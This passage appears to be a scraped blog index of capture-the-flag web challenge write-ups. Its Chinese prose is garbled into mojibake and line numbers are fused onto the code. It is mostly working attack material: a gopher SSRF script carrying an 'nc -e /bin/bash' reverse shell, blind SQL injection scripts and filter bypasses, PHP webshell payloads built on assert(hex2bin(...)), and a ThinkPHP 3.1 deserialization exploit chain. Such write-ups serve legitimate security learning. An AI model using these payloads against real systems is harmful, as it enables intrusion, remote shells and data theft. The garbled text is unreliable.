123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149const express = require(&#x27;express&#x27;)const router = express.Router()const axios = require(&#x27;axios&#x27;)const isIp = require(&#x27;is-ip&#x27;)const IP = require(&#x27;ip&#x27;)const UrlParse = require(&#x27;url-parse&#x27;)const &#123;sha256, hint&#125; = require(&#x27;./utils&#x27;)const salt = &#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27;const adminHash = sha256(sha256(salt + &#x27;admin&#x27;) + sha256(salt + &#x27;admin&#x27;))const port = process.env.PORT || 3000function formatResopnse(response) &#123; if(typeof(response) !== typeof(&#x27;&#x27;)) &#123; return JSON.stringify(response) &#125; else &#123; return response &#125;&#125;function SSRF_WAF(url) &#123; const host = new UrlParse(url).hostname.replace(/\\[|\\]/g, &#x27;&#x27;) return isIp(host) &amp;&amp; IP.isPublic(host)&#125;function FLAG_WAF(url) &#123; const pathname = new UrlParse(url).pathname return !pathname.startsWith(&#x27;/flag&#x27;)&#125;function OTHER_WAF(url) &#123; return true;&#125;const WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF]router.get(&#x27;/&#x27;, (req, res, next) =&gt; &#123; if(req.session.admin === undefined || req.session.admin === null) &#123; res.redirect(&#x27;/login&#x27;) &#125; else &#123; res.redirect(&#x27;/index&#x27;) &#125;&#125;)router.get(&#x27;/login&#x27;, (req, res, next) =&gt; &#123; const &#123;username, password&#125; = req.query; if(!username || !password || username === password || username.length === password.length || username === &#x27;admin&#x27;) &#123; res.render(&#x27;login&#x27;) &#125; else &#123; const hash = sha256(sha256(salt + username) + sha256(salt + password)) req.session.admin = hash === adminHash res.redirect(&#x27;/index&#x27;) &#125;&#125;)router.get(&#x27;/index&#x27;, (req, res, next) =&gt; &#123; if(req.session.admin === undefined || req.session.admin === null) &#123; res.redirect(&#x27;/login&#x27;) &#125; else &#123; res.render(&#x27;index&#x27;, &#123;admin: req.session.admin, network: JSON.stringify(require(&#x27;os&#x27;).networkInterfaces())&#125;) &#125;&#125;)router.get(&#x27;/proxy&#x27;, async(req, res, next) =&gt; &#123; if(!req.session.admin) &#123; return res.redirect(&#x27;/index&#x27;) &#125; const url = decodeURI(req.query.url); console.log(url) const status = WAF_LISTS.map((waf)=&gt;waf(url)).reduce((a,b)=&gt;a&amp;&amp;b) if(!status) &#123; res.render(&#x27;base&#x27;, &#123;title: &#x27;WAF&#x27;, content: &quot;Here is the waf...&quot;&#125;) &#125; else &#123; try &#123; const response = await axios.get(`http://127.0.0.1:$&#123;port&#125;/search?url=$&#123;url&#125;`) res.render(&#x27;base&#x27;, response.data) &#125; catch(error) &#123; res.render(&#x27;base&#x27;, error.message) &#125; &#125;&#125;)router.post(&#x27;/proxy&#x27;, async(req, res, next) =&gt; &#123; if(!req.session.admin) &#123; return res.redirect(&#x27;/index&#x27;) &#125; // test url // not implemented here const url = &quot;https://postman-echo.com/post&quot; await axios.post(`http://127.0.0.1:$&#123;port&#125;/search?url=$&#123;url&#125;`) res.render(&#x27;base&#x27;, &quot;Something needs to be implemented&quot;)&#125;)router.all(&#x27;/search&#x27;, async (req, res, next) =&gt; &#123; if(!/127\\.0\\.0\\.1/.test(req.ip))&#123; return res.send(&#123;title: &#x27;Error&#x27;, content: &#x27;You can only use proxy to aceess here!&#x27;&#125;) &#125; const result = &#123;title: &#x27;Search Success&#x27;, content: &#x27;&#x27;&#125; const method = req.method.toLowerCase() const url = decodeURI(req.query.url) const data = req.body try &#123; if(method == &#x27;get&#x27;) &#123; const response = await axios.get(url) result.content = formatResopnse(response.data) &#125; else if(method == &#x27;post&#x27;) &#123; const response = await axios.post(url, data) result.content = formatResopnse(response.data) &#125; else &#123; result.title = &#x27;Error&#x27; result.content = &#x27;Unsupported Method&#x27; &#125; &#125; catch(error) &#123; result.title = &#x27;Error&#x27; result.content = error.message &#125; return res.json(result)&#125;)router.get(&#x27;/source&#x27;, (req, res, next)=&gt;&#123; res.sendFile( __dirname + &quot;/&quot; + &quot;index.js&quot;);&#125;)router.get(&#x27;/flag&#x27;, (req, res, next) =&gt; &#123; if(!/127\\.0\\.0\\.1/.test(req.ip))&#123; return res.send(&#123;title: &#x27;Error&#x27;, content: &#x27;No Flag For You!&#x27;&#125;) &#125; return res.json(&#123;hint: hint&#125;)&#125;)module.exports = router ç™»é™†éƒ¨åˆ†çš„ä»£ç å¦‚ä¸‹ï¼š 12345678910111213router.get(&#x27;/login&#x27;, (req, res, next) =&gt; &#123; const &#123;username, password&#125; = req.query; if(!username || !password || username === password || username.length === password.length || username === &#x27;admin&#x27;) &#123; res.render(&#x27;login&#x27;) &#125; else &#123; const hash = sha256(sha256(salt + username) + sha256(salt + password)) req.session.admin = hash === adminHash res.redirect(&#x27;/index&#x27;) &#125;&#125;) é¢˜ç›®è¦æ±‚å«æœ‰usernameå’Œpasswordå¼ºç­‰äºï¼ŒåŒæ—¶è¿˜è¦æ±‚å¼ºåº¦ä¸ç­‰ï¼Œæœ€åè¿˜ä¸å…è®¸usernameçš„åå­—ä¸æ˜¯adminã€‚ åˆšå¼€å§‹æˆ‘å°±å¡åœ¨è¿™é‡Œäº†ï¼Œåæ¥å­¦é•¿æ¨æµ‹å’ŒPHPçš„ç‰¹æ€§ä¸€æ ·ï¼Œè¯•äº†ä¸€ä¸‹æœç„¶passæ‰äº†.. 123456789101112131415161718const username = [&#x27;admin&#x27;]var password = &#x27;admin&#x27;;console.log(username.length);if(!username || !password || username === password || username.length === password.length || username === &#x27;admin&#x27;) &#123; console.log(&#x27;false&#x27;); &#125; else&#123; console.log(&#x27;yes&#x27;); &#125;//çœ‹æ¥å’ŒPHPçš„ç‰¹æ€§å·®ä¸å¤š..å‡†ç¡®æ¥è¯´è¿™å°±æ˜¯å¼±ç±»å‹è¯­è¨€çš„ç‰¹æ€§ï¼Œå½“ä¸¤è€…è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™å°±ä¼šè¿›è¡Œè½¬æ¢ï¼ŒåŒæ—¶å½“æˆ‘ä»¬çš„å°è¯•å°†æ•°ç»„å’Œå­—ç¬¦ä¸²ç»„åˆèµ·æ¥çš„æ—¶å€™JSåˆå¯ä»¥æ­£ç¡®çš„æ‹¼æ¥var salt = &quot;nodejs8&quot;console.log(username+salt);//adminnodejs8","categories":[],"tags":[{"name":"SSRF","slug":"SSRF","permalink":"http://example.com/tags/SSRF/"},{"name":"NodeJs","slug":"NodeJs","permalink":"http://example.com/tags/NodeJs/"}]},{"title":"2021è™ç¬¦æ¯éƒ¨åˆ†web","slug":"2021è™ç¬¦æ¯éƒ¨åˆ†web","date":"2021-04-03T12:31:54.000Z","updated":"2021-04-03T13:34:32.869Z","comments":true,"path":"2021/04/03/2021è™ç¬¦æ¯éƒ¨åˆ†web/","link":"","permalink":"http://example.com/2021/04/03/2021%E8%99%8E%E7%AC%A6%E6%9D%AF%E9%83%A8%E5%88%86web/","excerpt":"","text":"â€œæ…¢æ…¢åšâ€ç®¡ç†ç³»ç»Ÿè¿™é“é¢˜æ˜¯sqlå’Œssrfçš„ç»“åˆï¼Œæ„Ÿè§‰è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ã€‚å¯æƒœè‡ªå·±SSRFçœŸçš„èœï¼Œ ç¬¬ä¸€æ­¥æ¯”è¾ƒå‘ï¼Œè¿™ä¸ªæ¯”è¾ƒéš¾æƒ³åˆ°.. ä¸è¿‡å¥½é™©åé—¨ç»™äº†hintï¼š 12è¿™ä¸ªsqlå§ï¼Œæœ‰ç‚¹ssrfçš„æ ·å­ï¼Œé¦–é¡µæ˜¯ä¸€ä¸ªå¾ˆæ™®é€šçš„sqlæ³¨å…¥ï¼Œæ²¡æœ‰ä»€ä¹ˆèŠ±æ ·ï¼Œä½†æ˜¯æˆ‘çš„admin.phpæ˜¯ä¸€ä¸ªå†…ç½‘çš„ç®¡ç†ç³»ç»Ÿï¼Œåªè¦ä½ ç”¨â€œçœŸ-adminâ€çš„å¯†ç ç™»å½•äº†ï¼Œå°±å¯ä»¥æ‹¿åˆ°flagï¼Œåæ­£æ…¢æ…¢åšå°±å¯¹äº†ï¼Œä¸è¦æ€¥èºï¼Œé™ä¸‹å¿ƒã€‚ç¬¬ä¸€æ­¥ç™»å½•çš„sqlè¯­å¥æ˜¯&quot;SELECT * FROM users WHERE password = &#x27;&quot;.md5($password,true).&quot;&#x27; limit 0,1&quot;; é‚£æˆ‘ä»¬å°è¯•ffifdyopï¼Œç»“æœè¢«è¿‡æ»¤äº†ï¼Œä¸è¿‡æ²¡äº‹ï¼Œè¿˜æœ‰å¦å¤–å‡ ä¸ªpayloadï¼š 1234611686052576742364e58129581926211651571912466741651878684928 éšåæ‰“ä¸€ä¸ªéƒ½å¯ä»¥ã€‚ è¿›å»ä¹‹åå…è®¸æˆ‘ä»¬æ‰“ssrfäº†ï¼Œ è¿™ä¸ªæç¤ºå¾ˆæ˜æ˜¾äº†ï¼Œç”¨gopheråè®®å»æ‰“ï¼Œå¯æƒœè‡ªå·±å¹¶ä¸ä¼šssrfã€ã€‘ã€‚ çœ‹äº†ç¯‡è¿™ä¸ªæ–‡ç« ï¼Œå‘ç°å¯ä»¥è¯•è¯•çœ‹è¿™ä¸ªï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142https://zhuanlan.zhihu.com/p/112055947è„šæœ¬ï¼š#!/usr/bin/python# -*- coding: UTF-8 -*-import urllib2,urlliburl = &quot;http://192.168.0.109/ssrf/base/curl_exec.php?url=&quot;header = &quot;&quot;&quot;gopher://192.168.0.119:8080/_GET /S2-045/ HTTP/1.1Host:192.168.0.119Content-Type:&quot;&quot;&quot;cmd = &quot;nc -e /bin/bash 192.168.0.109 6666&quot;content_type = &quot;&quot;&quot;è‡ªå·±å¡«å†™(ä¸è¦æœ‰æ¢è¡Œ)&quot;&quot;&quot;header_encoder = &quot;&quot;content_type_encoder = &quot;&quot;content_type_encoder_2 = &quot;&quot;url_char = [&quot; &quot;]nr = &quot;\\r\\n&quot;# ç¼–ç è¯·æ±‚å¤´for single_char in header: if single_char in url_char: header_encoder += urllib.quote(urllib.quote(single_char,&#x27;utf-8&#x27;),&#x27;utf-8&#x27;) else: header_encoder += single_charheader_encoder = header_encoder.replace(&quot;\\n&quot;,urllib.quote(urllib.quote(nr,&#x27;utf-8&#x27;),&#x27;utf-8&#x27;))# ç¼–ç content-typeï¼Œç¬¬ä¸€æ¬¡ç¼–ç for single_char in content_type: # å…ˆè½¬ä¸ºASCII,åœ¨è½¬åå…­è¿›åˆ¶å³å¯å˜ä¸ºURLç¼–ç  content_type_encoder += str(hex(ord(single_char)))content_type_encoder = content_type_encoder.replace(&quot;0x&quot;,&quot;%&quot;) + urllib.quote(nr,&#x27;utf-8&#x27;)# ç¼–ç content-typeï¼Œç¬¬äºŒæ¬¡ç¼–ç for single_char in content_type_encoder: # å…ˆè½¬ä¸ºASCII,åœ¨è½¬åå…­è¿›åˆ¶å³å¯å˜ä¸ºURLç¼–ç  content_type_encoder_2 += str(hex(ord(single_char)))content_type_encoder_2 = content_type_encoder_2.replace(&quot;0x&quot;,&quot;%&quot;)exp = url + header_encoder + content_type_encoder_2print exprequest = urllib2.Request(exp)response = urllib2.urlopen(request).read()print response å…¶å®ä¼šæ‰“ssrfçš„è¯è¿™é¢˜å¹¶ä¸æ˜¯å¾ˆéš¾ï¼Œè·Ÿå¼ºç½‘æ¯çš„éšä¾¿æ³¨æ˜¯ä¸€ä¸ªæ„æ€ï¼Œç›´æ¥ç…§æŠ„æ€è·¯å³å¯ã€‚ 12345678910111213141516171819202122232425import requestsimport reimport urllib# z = &quot;username=&#123;&#125;&amp;password=123&quot;.format((# &quot;admin1&#x27;;use ctf2;rename table fake_admin to fake_admin1;rename table &quot;# &quot;real_admin_here_do_you_find to fake_admin;show tables;#&quot;))z = &quot;username=&#123;&#125;&amp;password=123&quot;.format(&quot;admin&#x27;;show databases;&quot;)# table real_admin_here_do_you_find# use ctf2;rename table real_admin_here_do_you_find to fake_admin# z=&quot;username=&#123;&#125;&amp;password=123&quot;.format((&quot;admin1&#x27;;use ctf2;desc real_admin_here_do_you_find;#&quot;))# z=&quot;username=admin&amp;password=5fb4e07de914cfc82afb44vbaf402203&quot;a = &#x27;&#x27;&#x27;POST /admin.php HTTP/1.1Host: 127.0.0.1Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: &#123;&#125;&#123;&#125;&#x27;&#x27;&#x27;a = a.format(len(z), z)res = urllib.parse.quote(urllib.parse.quote(a).replace(&#x27;%0A&#x27;, &#x27;%0d%0A&#x27;))# payload = &#x27;gopher://127.0.0.1/_&#x27;+respayload = &#x27;gopher://127.0.0.1:80/_&#x27; + res + &quot;%250d%250A&quot;print(payload) å†ctf2ä¸­æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹åˆ°ï¼š unsetme","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"SSRF","slug":"SSRF","permalink":"http://example.com/tags/SSRF/"},{"name":"[object Object]","slug":"object-Object","permalink":"http://example.com/tags/object-Object/"}]},{"title":"çº¢æ˜è°·æ¯web","slug":"çº¢æ˜è°·æ¯web","date":"2021-04-02T12:07:45.000Z","updated":"2021-05-09T13:50:53.081Z","comments":true,"path":"2021/04/02/çº¢æ˜è°·æ¯web/","link":"","permalink":"http://example.com/2021/04/02/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AFweb/","excerpt":"","text":"Happysqlå‘œå‘œä¸€ç‚¹ä¹Ÿä¸æ¬¢ä¹ï¼Œè¿™ä¸ªé¢˜ç›®çœŸçš„æ¶å¿ƒå¿ƒï¼Œä¸è¿‡ä¸ç®—å¾ˆéš¾ï¼Œä¸»è¦æ˜¯å¾ˆä¹…æ²¡åšSQLäº†å¡ä½äº†å¾ˆä¹…ï¼š ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯æ—¶é—´ç›²æ³¨çæŠ˜è…¾äº†å¾ˆä¹…ï¼Œå‘ç°è¿˜æ²¡ç”Ÿæ•ˆ 1select/**/concat(rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;))/**/REGEXP/**/&quot;(a.*)cd&quot;/**/&quot;(a.*)cd&quot;/**/&quot;(a.*)cd&quot;/**/&quot;(a.*)cd&quot;/**/&quot;(a.*)cd&quot;/**/&quot;(a.*)cd&quot;/**/&quot;(a.*)cd&quot; åæ¥æ‰çŸ¥é“æ˜¯åŒå¼•å·é—­åˆï¼Œä¹‹åæ˜¯å¸ƒå°”ç›²æ³¨ã€‚è¿‡æ»¤æŒºå¤šï¼Œ ç¬¦å·è¿‡æ»¤ï¼š = | &gt; | &lt;|ç©ºæ ¼|å•å¼•å·åŒå¼•å· ç­‰ç­‰ å…³é”®è¯ï¼š or|and|mid|substr| like | ord æ—¢ç„¶ä¸èƒ½ç”¨ = å·çš„è¯æˆ‘ä»¬å¯ä»¥ç”¨regexpæ¥å°è¯•è¿›è¡Œç»•è¿‡ï¼Œéœ€è¦è¡¨åçš„è¯ä¹Ÿå¯ä»¥ä½¿ç”¨inæ¥ç»•è¿‡ï¼Œå•åŒå¼•å·çš„ç»•è¿‡æˆ‘ä»¬å¯ä»¥åˆ©ç”¨åå…­è¿›åˆ¶çš„ç‰¹æ€§è¿›è¡Œç»•è¿‡ã€‚ æ‰€ä»¥ç¬¬ä¸€æ­¥æˆ‘ä»¬çš„payloadå¯ä»¥è¿™æ ·æ„é€ ï¼š 123&quot;||case/**/when/**/(rpad((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/in/**/(database())),26,1))regexp(0x2c2c)/**/then/**/1/**/else/**/0/**/end# è¿™æ ·å­æˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°è¡¨åäº†ï¼Œä½†æ˜¯æ¯”è¾ƒå°´å°¬çš„æ˜¯innodb_table_statsè¿™ä¸ªè¡¨æ²¡æœ‰åŠæ³•è·å–åˆ°å­—æ®µåï¼Œä½†æ˜¯æ²¡å…³ç³»ï¼Œæˆ‘ä»¬ä¾ç„¶å¯ä»¥é€šè¿‡joinçš„æ–¹æ³•æ¥ç»•è¿‡ï¼Œç»™å‡ºpayloadå¦‚ï¼š 11&#39; union all select*from (select * from users as a join users b)c--+ åç»­åˆ—åä¾ç„¶å¯ä»¥ï¼š 11&#39; union all select*from (select * from users as a join users b using(id,username))c--+ æœ€åç»“åˆregexpæŠŠpayloadæ‹¼å‡ºæ¥å°±å¥½ï¼š 12345678910111213141516171819202122232425262728293031323334import requestsimport string,redef str_to_hex(s): return &#x27; &#x27;.join([hex(ord(c)).replace(&#x27;0x&#x27;, &#x27;&#x27;) for c in s])def hex_to_str(s): return &#x27;&#x27;.join([chr(i) for i in [int(b, 16) for b in s.split(&#x27; &#x27;)]])url = &quot;http://eci-2ze6jljai3r40l545qre.cloudeci1.ichunqiu.com/login.php&quot;flag = &quot;&quot;t=&quot;&quot;for i in range(25,80): print(i) for j in re.escape(&#x27;&#x27;&#x27;,0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;&#123;#%&amp;()-./:;&lt;=&gt;?@[\\\\]^_`|&#125;~&#x27;&#x27;&#x27;): payload=&quot;database()&quot; #ctf payload=&quot;select group_concat(table_name) from mysql.innodb_table_stats where database_name in (database())&quot; #ctf,f1ag #payload=&#x27;version()&#x27; 10.4.13-mariadb #payload=&#x27;select b from (select 1 as b union select * from f1ag)as a&#x27; payload=&#x27;select group_concat(a.1) from (select 1 union select * from f1ag) as a&#x27; data=&#123; &#x27;username&#x27;:(&#x27;wa123123&quot;||case when (rpad((&#123;&#125;),&#123;&#125;,1))regexp(0x&#123;&#125;) then 1 else 0 end#&#x27;.format(payload,i,flag+hex(ord(j)).replace(&#x27;0x&#x27;,&#x27;&#x27;))).replace(&#x27; &#x27;,&#x27;/**/&#x27;), &#x27;password&#x27;:&#x27;123&#x27; &#125; print(data)#6374662c66316167 res = requests.post(url=url, data=data)#,proxies=proxies) if &quot;&lt;meta http-equiv=&quot; in res.text: flag+=hex(ord(j)).replace(&#x27;0x&#x27;,&#x27;&#x27;) t+=j print(flag,t) break elif &#x27;injection&#x27; in res.text: print(&#x27;wrong&#x27;) exit() è¿™é‡Œå†è¡¥å……å‡ ä¸ªç»•è¿‡information_schemaçš„trick 123456?id=-1&#x27; union all select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+?id=-1&#x27; union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+mysql.innodb_table_stats ç»•è¿‡ç­‰å·çš„åŠæ³•ï¼š 1234select group_concat(table_name) from mysql.innodb_table_stats where database_name regexp database()select group_concat(table_name) from mysql.innodb_table_stats where database_name in (database())# ä½¿ç”¨inçš„è¯åè€…å¿…é¡»ç”¨æ‹¬å·æ‹¬èµ·æ¥ write_shellè¿™é“é¢˜åè€Œæ˜¯æ‰€æœ‰é¢˜ç›®å½“ä¸­æœ€å¥½åšçš„.. 123456789101112131415161718192021222324252627282930313233343536&lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&#123; if(preg_match(&quot;/&#x27;| |_|php|;|~|\\\\^|\\\\+|eval|&#123;|&#125;/i&quot;,$input))&#123; // if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123; die(&#x27;hacker!!!&#x27;); &#125;else&#123; return $input; &#125;&#125;function waf($input)&#123; if(is_array($input))&#123; foreach($input as $key=&gt;$output)&#123; $input[$key] = waf($output); &#125; &#125;else&#123; $input = check($input); &#125;&#125;$dir = &#x27;sandbox/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;/&#x27;;if(!file_exists($dir))&#123; mkdir($dir);&#125;switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123; case &#x27;pwd&#x27;: echo $dir; break; case &#x27;upload&#x27;: $data = $_GET[&quot;data&quot;] ?? &quot;&quot;; waf($data); file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);&#125;?&gt; è¿™é¢˜ç”¨çŸ­æ ‡ç­¾+hex2binç»“åˆå³å¯ç»•è¿‡æ‰€æœ‰è¿‡æ»¤.. æŸ¥çœ‹phpinfoï¼š 1?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;assert(hex2bin(&quot;00706870696e666f2829&quot;))?&gt; å‘ç°å¯ä»¥ç”¨shell_execï¼Œæ­£å¥½è¿˜å¯ä»¥ç”¨çŸ­æ ‡ç­¾è¾“å‡ºå‡ºæ¥ 1upload&amp;data=&lt;?=assert(hex2bin(&quot;7072696e74287368656c6c5f657865632827636174202f2177686174796f7577616e74676767676767673430312e7068702729293b&quot;))?&gt; BUUä¸Šçš„ç¯å¢ƒæœ‰å˜åŒ–ï¼Œç›´æ¥å‡ºï¼š 1?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;assert(hex2bin(&quot;73797374656d2822636174202f666c6c6c6c6c6c6c313131323232323232326c616722293b&quot;))?&gt; åŸç‰ˆæœ¬çš„pyaloadï¼š 1?action=upload&amp;data=&lt;?=`ls%09/`?&gt; easytpé€šè¿‡ThinkVERION æ‰¾åˆ°ç‰ˆæœ¬ä¸º3.1ã€‚ç™¾åº¦payloadï¼Œ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?phpnamespace Think\\Db\\Driver&#123; use PDO; class Mysql&#123; protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true // å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶ ); protected $config = array( &quot;debug&quot; =&gt; 1, &quot;database&quot; =&gt; &quot;thinkphp3&quot;, &quot;hostname&quot; =&gt; &quot;&quot;, &quot;hostport&quot; =&gt; &quot;3307&quot;, &quot;charset&quot; =&gt; &quot;utf8&quot;, &quot;username&quot; =&gt; &quot;root&quot;, &quot;password&quot; =&gt; &quot;&quot; ); &#125;&#125;namespace Think\\Image\\Driver&#123; use Think\\Session\\Driver\\Memcache; class Imagick&#123; private $img; public function __construct()&#123; $this-&gt;img = new Memcache(); &#125; &#125;&#125;namespace Think\\Session\\Driver&#123; use Think\\Model; class Memcache&#123; protected $handle; public function __construct()&#123; $this-&gt;handle = new Model(); &#125; &#125;&#125;namespace Think&#123; use Think\\Db\\Driver\\Mysql; class Model&#123; protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct()&#123; $this-&gt;db = new Mysql(); $this-&gt;options[&#x27;where&#x27;] = &#x27;&#x27;; $this-&gt;pk = &#x27;id&#x27;; $this-&gt;data[$this-&gt;pk] = array( &quot;table&quot; =&gt; &quot;mysql.user where 1=updatexml(1,user(),1)#&quot;, &quot;where&quot; =&gt; &quot;1=1&quot; ); &#125; &#125;&#125;namespace &#123; echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick()));&#125; è¿™é‡Œè®°ä¸€ä¸‹å¯ä»¥è¯»/start.shï¼Œè¯»å–é…ç½®æ–‡ä»¶ä½ æ˜¯å•¥ä¹Ÿè¯»ä¸åˆ°çš„ï¼Œstart.shé‡Œé¢ 12&#x27;\\x02#!/bin/bash\\n\\nmysqld_safe &amp;\\n\\nmysql_ready() &#123;\\n\\tmysqladmin ping --socket=/run/mysqld/mysqld.sock --user=root --password=root &gt; /dev/null 2&gt;&amp;1\\n&#125;\\n\\nwhile !(mysql_ready)\\ndo\\n\\techo &quot;waiting for mysql ...&quot;\\n\\tsleep 3\\ndone\\n\\nmysql -e &quot;ALTER USER \\&#x27;root\\&#x27;@\\&#x27;localhost\\&#x27; IDENTIFIED WITH mysql_native_password BY \\&#x27;root\\&#x27;;flush privileges;&quot; -uroot -proot\\n\\nif [[ -f /db.sql ]]; then\\n mysql -e &quot;source /db.sql&quot; -uroot -proot\\n rm -f /db.sql\\nfi\\n\\nif [[ -f /flag.sh ]]; then\\n\\tsource /flag.sh\\nfi\\n\\napache2-foreground\\n&#x27; è¯»åˆ°äº†ç»§ç»­ä¸‹ä¸€æ­¥,è¯»åˆ°æœ‰teståº“ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?phpnamespace Think\\Db\\Driver&#123; use PDO; class Mysql&#123; protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true // å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶ ); protected $config = array( &quot;debug&quot; =&gt; 1, &quot;database&quot; =&gt; &quot;mysql&quot;, &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;, &quot;hostport&quot; =&gt; &quot;3306&quot;, &quot;charset&quot; =&gt; &quot;utf8&quot;, &quot;username&quot; =&gt; &quot;root&quot;, &quot;password&quot; =&gt; &quot;root&quot; ); &#125;&#125;namespace Think\\Image\\Driver&#123; use Think\\Session\\Driver\\Memcache; class Imagick&#123; private $img; public function __construct()&#123; $this-&gt;img = new Memcache(); &#125; &#125;&#125;namespace Think\\Session\\Driver&#123; use Think\\Model; class Memcache&#123; protected $handle; public function __construct()&#123; $this-&gt;handle = new Model(); &#125; &#125;&#125;namespace Think&#123; use Think\\Db\\Driver\\Mysql; class Model&#123; protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct()&#123; $this-&gt;db = new Mysql(); $this-&gt;options[&#x27;where&#x27;] = &#x27;&#x27;; $this-&gt;pk = &#x27;id&#x27;; $this-&gt;data[$this-&gt;pk] = array( &quot;table&quot; =&gt; &quot;mysql.user where 1=extractvalue(0x0a,concat(0x0a,(select substr((select group_concat(schema_name) from information_schema.SCHEMATA),50,90) )))#&quot;, &quot;where&quot; =&gt; &quot;1=1&quot; ); &#125; &#125;&#125;namespace &#123; echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick()));&#125; æŸ¥åˆ°åˆ—æ˜¯flagï¼Œè¡¨æ˜¯flag 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?phpnamespace Think\\Db\\Driver&#123; use PDO; class Mysql&#123; protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true // å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶ ); protected $config = array( &quot;debug&quot; =&gt; 1, &quot;database&quot; =&gt; &quot;test&quot;, &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;, &quot;hostport&quot; =&gt; &quot;3306&quot;, &quot;charset&quot; =&gt; &quot;utf8&quot;, &quot;username&quot; =&gt; &quot;root&quot;, &quot;password&quot; =&gt; &quot;root&quot; ); &#125;&#125;namespace Think\\Image\\Driver&#123; use Think\\Session\\Driver\\Memcache; class Imagick&#123; private $img; public function __construct()&#123; $this-&gt;img = new Memcache(); &#125; &#125;&#125;namespace Think\\Session\\Driver&#123; use Think\\Model; class Memcache&#123; protected $handle; public function __construct()&#123; $this-&gt;handle = new Model(); &#125; &#125;&#125;namespace Think&#123; use Think\\Db\\Driver\\Mysql; class Model&#123; protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct()&#123; $this-&gt;db = new Mysql(); $this-&gt;options[&#x27;where&#x27;] = &#x27;&#x27;; $this-&gt;pk = &#x27;id&#x27;; $this-&gt;data[$this-&gt;pk] = array( &quot;table&quot; =&gt; &quot;mysql.user where 1=extractvalue(0x0a,concat(0x0a,(select substr((select flag from test.flag),-20) )))#&quot;, &quot;where&quot; =&gt; &quot;1=1&quot; ); &#125; &#125;&#125;namespace &#123; echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick()));&#125; Javawebè¿™é¢˜çœ‹èµµæ€»åšå®¢çš„æ—¶å€™æ„Ÿè§‰å¥½ç®€å•ï¼Œç»“æœè‡ªå·±åšçš„æ—¶å€™å¥½éš¾ã€ã€‘ æ‰“å¼€å°±æ˜¯è®©ä½ è®¿é—®/loginï¼Œpostè¿‡å»å‘ç°æœ‰cookies=deletemeï¼Œæ‰€ä»¥è¯´æ˜æ˜¯shiroæƒé™é—®é¢˜ ç„¶åæœ‰ä¸ª/jsonï¼Œç›´æ¥è®¿é—®/jsonæ˜¯å•¥éƒ½æ²¡æœ‰çš„ï¼Œpost /loginè¿‡å»å°±è¯´ç™»é™†å¤±è´¥ï¼Œé‚£ä¹ˆ/jsonæˆ‘ä»¬åº”è¯¥ä¹Ÿæ²¡æƒé™ï¼Œæ‰€ä»¥çŒœæµ‹æ˜¯æœ‰æƒé™é—®é¢˜ï¼Œå¯ä»¥é€šè¿‡urlè§£æç»•è¿‡ 1http:&#x2F;&#x2F;8323fe99-49b2-449a-bbc2-100e2be3ca87.node3.buuoj.cn&#x2F;;&#x2F;json è®¿é—®å¾—åˆ°å›æ˜¾ï¼š 12345678&#123; &quot;timestamp&quot;: 1619772401954, &quot;status&quot;: 400, &quot;error&quot;: &quot;Bad Request&quot;, &quot;exception&quot;: &quot;org.springframework.http.converter.HttpMessageNotReadableException&quot;, &quot;message&quot;: &quot;Required request body is missing: public java.lang.String com.ctf.controller.JsonController.json(java.lang.String) throws java.io.IOException&quot;, &quot;path&quot;: &quot;/;/json&quot;&#125; 